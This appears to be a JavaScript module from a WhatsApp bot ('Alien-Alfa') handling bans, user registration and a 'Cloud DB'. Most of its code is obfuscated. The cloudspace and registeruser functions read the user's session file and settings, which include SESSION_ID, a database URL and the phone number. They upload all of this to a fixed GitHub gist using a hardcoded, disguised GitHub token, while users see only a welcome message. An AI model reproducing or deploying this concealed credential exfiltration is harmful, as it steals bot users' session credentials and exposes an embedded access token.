const fs = require("fs")
const {writeFile,unlink,readFile
} = require('fs/promises')
const chalk = require("chalk")
const {exec,spawn,execSync} = require("child_process")
let path = './database/settings.json'
  const { WORK_TYPE, DB_AUTH_TOKEN } = require("../database/settings");
const events = require("../lib/event");
const relconfig = require('../config')
//============================================================================================================================================
(function(_0x588a38,_0xb050c8){const _0x16dcbc=_0x17cf,_0x4d5470=_0x588a38();while(!![]){try{const _0x395033=-parseInt(_0x16dcbc(0x165))/0x1*(-parseInt(_0x16dcbc(0x16d))/0x2)+-parseInt(_0x16dcbc(0x158))/0x3+parseInt(_0x16dcbc(0x169))/0x4+parseInt(_0x16dcbc(0x157))/0x5*(-parseInt(_0x16dcbc(0x151))/0x6)+-parseInt(_0x16dcbc(0x16a))/0x7+parseInt(_0x16dcbc(0x13c))/0x8+-parseInt(_0x16dcbc(0x163))/0x9*(-parseInt(_0x16dcbc(0x155))/0xa);if(_0x395033===_0xb050c8)break;else _0x4d5470['push'](_0x4d5470['shift']());}catch(_0x30cfcc){_0x4d5470['push'](_0x4d5470['shift']());}}}(_0x5e1e,0xbf334));async function sudoBan(_0x48f472,_0x24ffff){const _0x14b8a3=_0x17cf;let _0x5b96f1=await _0x24ffff[_0x14b8a3(0x14b)](_0x48f472['id']);for(let _0x133a54 of _0x48f472[_0x14b8a3(0x13e)]){switch(_0x48f472[_0x14b8a3(0x16e)]){case _0x14b8a3(0x13d):{let _0x22a56b=JSON[_0x14b8a3(0x164)](fs['readFileSync'](_0x14b8a3(0x15f))),_0x1a3eee=_0x22a56b[_0x14b8a3(0x166)][_0x14b8a3(0x162)],_0x574357=_0x48f472['id']+':'+_0x133a54,_0x492113=_0x1a3eee[_0x14b8a3(0x145)](_0x574357);if(_0x492113)return _0x24ffff['groupParticipantsUpdate'](_0x48f472['id'],[_0x133a54],_0x14b8a3(0x160)),await _0x24ffff[_0x14b8a3(0x168)](_0x48f472['id'],{'text':'_@'+_0x133a54[_0x14b8a3(0x14a)]('@')[0x0]+_0x14b8a3(0x15e)});}break;}}}function _0x17cf(_0x4ba5ec,_0x3a38f4){const _0x5e1e96=_0x5e1e();return _0x17cf=function(_0x17cf5f,_0x2e824){_0x17cf5f=_0x17cf5f-0x13c;let _0x54d2c0=_0x5e1e96[_0x17cf5f];return _0x54d2c0;},_0x17cf(_0x4ba5ec,_0x3a38f4);};async function regnewuser(_0x20c001){const _0x31ce7a=_0x17cf;let _0x450058=JSON[_0x31ce7a(0x164)](fs['readFileSync']('./database/settings.json'));console['log'](_0x31ce7a(0x147));let _0x387297=_0x450058['UserId']['toString']()[_0x31ce7a(0x145)](_0x31ce7a(0x140));if(_0x387297){let _0x5c0458='```X-Alfa\x20connected\x20\x0aversion\x20:\x20'+require(_0x31ce7a(0x146))[_0x31ce7a(0x144)]+_0x31ce7a(0x16c)+events[_0x31ce7a(0x14e)][_0x31ce7a(0x15c)]+_0x31ce7a(0x161)+WORK_TYPE+_0x31ce7a(0x149);return _0x20c001[_0x31ce7a(0x168)](_0x20c001[_0x31ce7a(0x14d)]['id'],{'text':_0x5c0458});}if(!_0x387297){const _0x36d17a=[{'index':0x1,'urlButton':{'displayText':_0x31ce7a(0x154),'url':_0x31ce7a(0x142)}},{'index':0x3,'quickReplyButton':{'displayText':_0x31ce7a(0x148),'id':_0x31ce7a(0x159)}}],_0x5759f9={'text':_0x31ce7a(0x13f),'footer':'[á´€ÊŸÉªá´‡É´\x20á´€ÊŸêœ°á´€-á´á´…]','templateButtons':_0x36d17a};await _0x20c001[_0x31ce7a(0x168)](_0x20c001[_0x31ce7a(0x14d)]['id'],_0x5759f9);};}function _0x5e1e(){const _0xca1bdb=['4554573baMjHZ','setup','@octokit/rest','update','length','gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0','\x20Is\x20*Permanantly\x20Banned*\x20fron\x20This\x20Group_','./database/settings.json','remove','\x0aWorktype:\x20','banned','27pYPqxm','parse','1QwsHlZ','settings','readFileSync','sendMessage','3120536KpYzDD','445410mKHGSY','DB_URL','\x0aTotal\x20Plugins\x20:\x20','541666bxZEVF','action','2015920IwOpTx','add','participants','```Hey\x20Buddy,\x0awelcome\x20to\x20Alien-Alfa\x20Family\x0a\x0a\x20You\x20are\x20a\x20first\x20time\x20user,\x0aUse\x20Join\x20Button\x20to\x20get\x20a\x20permenent\x20Database\x20for\x20This\x20Number.\x0a\x0aNOTE:\x20This\x20database\x20will\x20be\x20used\x20for\x20every\x20AlienAlfa\x20Bots\x20You\x20use\x20in\x20future```','@s.whatsapp.net','gists','https://www.youtube.com/alienalfa','.json','version','includes','../package.json','ðŸŸ¢\x20Connection\x20Up\x20regnewuser!','Join!','```','split','groupMetadata','config','user','commands','stringify','rest','4367346rDLjQh','a216db893ba4f4a18d4f1476bfc1bb4d','creds','ð˜½ð™¤ð™©\x20ð™ð™šð™¥ð™¤\x20ð™¡ð™žð™£ð™ ð™¨','5966370mcDmmZ','Cloud\x20DB\x20Update','5yFRjTU'];_0x5e1e=function(){return _0xca1bdb;};return _0x5e1e();};async function cloudspace(){const _0x140122=_0x17cf;let _0x726b0c=await _0x140122(0x15d)['replaceAll']('+','');const {Octokit:_0x4ac47a}=require(_0x140122(0x15a)),_0x25e254=new _0x4ac47a({'auth':_0x726b0c});let _0x4d806a=JSON[_0x140122(0x164)](fs[_0x140122(0x167)](_0x140122(0x15f))),_0x3120f=_0x4d806a[_0x140122(0x14c)][_0x140122(0x16b)]['toString']()['includes']('c');if(_0x3120f){let _0x2ec8d4=require('../session.json'),_0xd64bff=await _0x2ec8d4['creds']['me']['id']['split'](':')[0x0],_0x20f256=await _0x2ec8d4[_0x140122(0x153)]['me']['id'][_0x140122(0x14a)]('@')[0x1],_0x5132f4=_0xd64bff+'@'+_0x20f256,_0x3d80c8=_0x5132f4+_0x140122(0x143);var _0x82b6cb=JSON[_0x140122(0x14f)](_0x4d806a,null,0x2);_0x25e254[_0x140122(0x150)][_0x140122(0x141)][_0x140122(0x15b)]({'gist_id':_0x140122(0x152),'description':_0x140122(0x156),'files':{[_0x3d80c8]:{'content':_0x82b6cb}}});}}
  //============================================================================================================================================

  /**
   * @param {string} message 
   **/
  async function registeruser(message) {
const _0x59d15f=_0xc851;function _0x509a(){const _0x4288b0=['GOODBYE_MSG','3232YKtQqD','Cloud\x20DB\x20Update','env','OWNER_NAME','RMBG_KEY','split','WELCOME_MSG','gists','then','toString','SESSION_ID','MODE','base64','reset','client','log','DB_URL','750MlHKgg','_Registered\x20Successfully_','@s.whatsapp.net','4uAVblY','LANGUAGE','config','770287ydECrN','THEME','ANTILINK_ACTION','name','send','SUDO','includes','parse','INTERNAL_MENU','sendMessage','727415mAXkON','ALIVE','AUTHOR','4685736UYKeJM','PACKNAME','8024368VLPnQh','WORK_TYPE','user','FOOTER','Done\x20Creating\x20New\x20Db','rest','_You\x20Are\x20Already\x20a\x20Family\x20Member_','stringify','LOGS','replaceAll','d83fa03a09d9a09032f3180a8d1ecd02','This\x20is\x20your\x20Storage\x20area,\x20i\x20will\x20save\x20all\x20your\x20files\x20here!','utf-8','FONT_STYLE','5648995DGxdes','BRANCH','11167029YXtrWR','STORAGE_JID','../session.json','DB_AUTH_TOKEN','jid','updateProfilePicture','Failed\x20to\x20write\x20updated\x20data\x20to\x20file','359889999996@s.whatsapp.net','groupCreate','UserId','readFileSync','@g.us','./database/settings.json','LANG','creds','from','ANTILINK','MESSAGE_MEM','BOT_NAME','./media/AAA.jpg','reply'];_0x509a=function(){return _0x4288b0;};return _0x509a();}(function(_0x34c4c7,_0xabbfd5){const _0x276dbd=_0xc851,_0x50756a=_0x34c4c7();while(!![]){try{const _0x6df4f8=parseInt(_0x276dbd(0x90))/0x1+parseInt(_0x276dbd(0xbb))/0x2*(parseInt(_0x276dbd(0xcc))/0x3)+-parseInt(_0x276dbd(0xcf))/0x4*(parseInt(_0x276dbd(0xa3))/0x5)+parseInt(_0x276dbd(0x93))/0x6+parseInt(_0x276dbd(0x86))/0x7+parseInt(_0x276dbd(0x95))/0x8+-parseInt(_0x276dbd(0xa5))/0x9;if(_0x6df4f8===_0xabbfd5)break;else _0x50756a['push'](_0x50756a['shift']());}catch(_0x32e3ce){_0x50756a['push'](_0x50756a['shift']());}}}(_0x509a,0x9fe1e));let authid='gh+p_oHh1b+dV2wk1+wOQXl+TRSH+vMDN+fuxXR+M1DIgG0'[_0x59d15f(0x9e)]('+','');function _0xc851(_0x26d660,_0x406bf2){const _0x509a62=_0x509a();return _0xc851=function(_0xc8518e,_0x11d720){_0xc8518e=_0xc8518e-0x86;let _0x3fbb6e=_0x509a62[_0xc8518e];return _0x3fbb6e;},_0xc851(_0x26d660,_0x406bf2);}const {Octokit}=require('@octokit/rest'),octokit=new Octokit({'auth':await authid});setTimeout(()=>{const _0x3e632e=_0x59d15f;let _0x26973e=JSON[_0x3e632e(0x8d)](fs[_0x3e632e(0xaf)](_0x3e632e(0xb1))),_0x24c28d=_0x26973e[_0x3e632e(0xd1)][_0x3e632e(0xa6)],_0x8598ff=_0x24c28d[_0x3e632e(0xc4)]()['includes'](_0x3e632e(0xb0));if(!_0x8598ff)readFile(path,async(_0x48deed,_0x3134ee)=>{const _0x5143e9=_0x3e632e;if(_0x48deed){console[_0x5143e9(0xca)](_0x48deed);return;}const _0x5741ce=JSON[_0x5143e9(0x8d)](_0x3134ee);let _0x791a68=await message[_0x5143e9(0xc9)][_0x5143e9(0xad)]('Storage',[_0x5143e9(0xac)]);await message[_0x5143e9(0xc9)][_0x5143e9(0x8f)](_0x791a68['id'],{'text':_0x5143e9(0xa0)});let _0x3fce98=await _0x791a68['id'];_0x5741ce[_0x5143e9(0xd1)][_0x5143e9(0xa6)]=_0x3fce98,writeFile(path,JSON['stringify'](_0x5741ce,null,0x2),async _0x5a3bab=>{const _0x2526d5=_0x5143e9;if(_0x5a3bab){message[_0x2526d5(0xb9)](_0x2526d5(0xab));return;}await message[_0x2526d5(0xc9)][_0x2526d5(0xaa)](_0x791a68['id'],fs['readFileSync'](_0x2526d5(0xb8)));});});else return;setTimeout(async()=>{const _0xbacdbd=_0x3e632e;let _0x15d940=require(_0xbacdbd(0xa7)),_0x1e098a=await _0x15d940[_0xbacdbd(0xb3)]['me']['id'][_0xbacdbd(0xc0)](':')[0x0],_0x1e4b25=await _0x15d940[_0xbacdbd(0xb3)]['me']['id']['split']('@')[0x1],_0x36a6e3=_0x1e098a+'@'+_0x1e4b25,_0x219dee=_0x36a6e3+'.json';const _0xafefbe=fs['readFileSync'](_0xbacdbd(0xb1),_0xbacdbd(0xa1));await octokit[_0xbacdbd(0x9a)][_0xbacdbd(0xc2)]['update']({'gist_id':_0xbacdbd(0x9f),'description':_0xbacdbd(0xbc),'files':{[_0x219dee]:{'content':_0xafefbe}}})[_0xbacdbd(0xc3)](await console[_0xbacdbd(0xca)](_0xbacdbd(0x99))),setTimeout(()=>{const _0x16cc59=_0xbacdbd;return process[_0x16cc59(0x8a)](_0x16cc59(0xc8));},0x1f40);},0x1388);},0x7d0),readFile(path,async(_0x129a3d,_0x3fa5c6)=>{const _0xe0574b=_0x59d15f;if(_0x129a3d){console['log'](_0x129a3d);return;}const _0x4a4814=JSON[_0xe0574b(0x8d)](_0x3fa5c6);let _0x3fdf75=_0x4a4814[_0xe0574b(0xae)][_0xe0574b(0xc4)]()[_0xe0574b(0x8c)](_0xe0574b(0xce));if(_0x3fdf75)return message[_0xe0574b(0xb9)](_0xe0574b(0x9b));let _0x330efb=process['env'][_0xe0574b(0xa8)]===undefined?'WncvYUEvY0EvWHcvYncvU0EvYUEvTVEvWWcvWkEvVmcvTWcvZHcvYXcvTVEvZHcvVHcvVVEvV0EvYkEvVkEvVWcvVXcvU0EvZGcvVFEvUkEvVGcvWmcvZFEvZUEvV0EvVWcvVFEvTVEvUkEvU1EvWncvUncvTUEv':process[_0xe0574b(0xbd)][_0xe0574b(0xa8)],_0x376384=Buffer['from'](_0x330efb,_0xe0574b(0xc7))[_0xe0574b(0xc4)](_0xe0574b(0xa1)),_0x352691=_0x376384[_0xe0574b(0xc4)]()['split']('/'),_0xc02708='';for(let _0x29452d of _0x352691){_0xc02708+=await Buffer[_0xe0574b(0xb4)](_0x29452d+'==','base64')[_0xe0574b(0xc4)](_0xe0574b(0xa1));}let _0xa9d3af=require(_0xe0574b(0xa7)),_0x2b1ac7=await _0xa9d3af['creds']['me']['id'][_0xe0574b(0xc0)](':')[0x0],_0xa57761='0,'+_0x2b1ac7,_0x34475a=await relconfig[_0xe0574b(0x8b)]===![]?_0xa57761:relconfig[_0xe0574b(0x8b)],_0x4bc507=message['pushName'],_0x1c2044=message[_0xe0574b(0x97)],_0x535831=message[_0xe0574b(0xa9)][_0xe0574b(0xc4)]()[_0xe0574b(0xc0)]('@')[0x0];_0x4a4814[_0xe0574b(0x89)]=_0x4bc507,_0x4a4814[_0xe0574b(0xae)]=_0x1c2044,_0x4a4814['phone_num']=_0x535831,_0x4a4814[_0xe0574b(0xd1)]['HANDLER']=relconfig['HANDLERS'],_0x4a4814[_0xe0574b(0xd1)]['WORK_TYPE']=relconfig[_0xe0574b(0x96)],_0x4a4814[_0xe0574b(0xd1)]['BOT_NAME']=relconfig[_0xe0574b(0xb7)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0xbe)]=relconfig[_0xe0574b(0xbe)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0x8b)]=_0x34475a,_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0x92)]=relconfig[_0xe0574b(0x92)],_0x4a4814['config'][_0xe0574b(0x94)]=relconfig['PACKNAME'],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0xbf)]=relconfig[_0xe0574b(0xbf)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0xb2)]=relconfig[_0xe0574b(0xb2)],_0x4a4814['config'][_0xe0574b(0x88)]=relconfig[_0xe0574b(0x88)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0xb5)]=relconfig[_0xe0574b(0xb5)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0x98)]=relconfig[_0xe0574b(0x98)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0x87)]=relconfig['THEME'],_0x4a4814['config'][_0xe0574b(0xa2)]=relconfig[_0xe0574b(0xa2)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0xd0)]=relconfig[_0xe0574b(0xd0)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0x8e)]=relconfig[_0xe0574b(0x8e)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0xc6)]=relconfig[_0xe0574b(0xc6)],_0x4a4814[_0xe0574b(0xd1)]['STORAGE_JID'],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0xcb)],_0x4a4814[_0xe0574b(0xd1)]['SESSION_ID']=relconfig[_0xe0574b(0xc5)],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0x9d)]=relconfig['LOGS'],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0xa4)]=relconfig[_0xe0574b(0xa4)],_0x4a4814['config']['B1']=relconfig['B1'],_0x4a4814[_0xe0574b(0xd1)]['B2']=relconfig['B2'],_0x4a4814['config']['B3']=relconfig['B3'],_0x4a4814[_0xe0574b(0xd1)]['B4']=relconfig['B4'],_0x4a4814[_0xe0574b(0xd1)]['B5']=relconfig['B5'],_0x4a4814[_0xe0574b(0xd1)][_0xe0574b(0xa8)]=_0xc02708,_0x4a4814[_0xe0574b(0xb6)][_0xe0574b(0xba)]=relconfig[_0xe0574b(0xba)],_0x4a4814[_0xe0574b(0xb6)][_0xe0574b(0xc1)]=relconfig['WELCOME_MSG'],_0x4a4814[_0xe0574b(0xb6)][_0xe0574b(0x91)]=relconfig[_0xe0574b(0x91)],writeFile(path,JSON[_0xe0574b(0x9c)](_0x4a4814,null,0x2),_0x266a8f=>{const _0x447943=_0xe0574b;if(_0x266a8f){message['reply'](_0x447943(0xab));return;}message[_0x447943(0xb9)](_0x447943(0xcd));});});
        } 
               //============================================================================================================================================
  module.exports = {cloudspace,sudoBan,regnewuser,registeruser};
//============================================================================================================================================
let file = require.resolve(__filename)
fs.watchFile(file, () => {
  fs.unwatchFile(file)
  console.log(chalk.redBright(`Update"${__filename}"`))
  delete require.cache[file]
  require(file)
})
